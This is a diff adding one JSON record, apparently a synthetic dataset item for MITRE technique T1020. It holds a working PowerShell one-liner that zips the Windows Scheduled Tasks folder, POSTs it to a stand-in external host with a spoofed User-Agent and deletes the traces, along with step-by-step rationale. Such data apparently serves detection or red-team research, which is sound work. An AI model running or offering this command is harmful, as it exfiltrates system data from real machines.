@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$ProgressPreference='SilentlyContinue'; $z=Join-Path $env:TEMP ('tasks_'+(Get-Date -Format yyyyMMddHHmmss)+'.zip'); Compress-Archive -Path 'C:\\Windows\\System32\\Tasks' -DestinationPath $z -Force; Invoke-WebRequest -Uri 'https://cdn.example.net/content/upload/tasks' -Method Post -InFile $z -ContentType 'application/zip' -Headers @{ 'User-Agent'='Mozilla/5.0'; 'Accept'='*/*' } -ErrorAction SilentlyContinue; Remove-Item $z -Force",
+  "explanation": "Packages the Scheduled Tasks directory and exfiltrates it over HTTPS POST to a remote endpoint.",
+  "rationale_steps": [
+    "Compress scheduled task definitions that reveal persistence and activity.",
+    "Send the archive via Invoke-WebRequest POST with a generic content type.",
+    "Suppress progress and clean up temporary artifacts."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-ed594729-d552ecc6",
+  "source_prompt_hash": "ed594729",
+  "timestamp_utc": "2025-09-30T09:16:21.768830Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
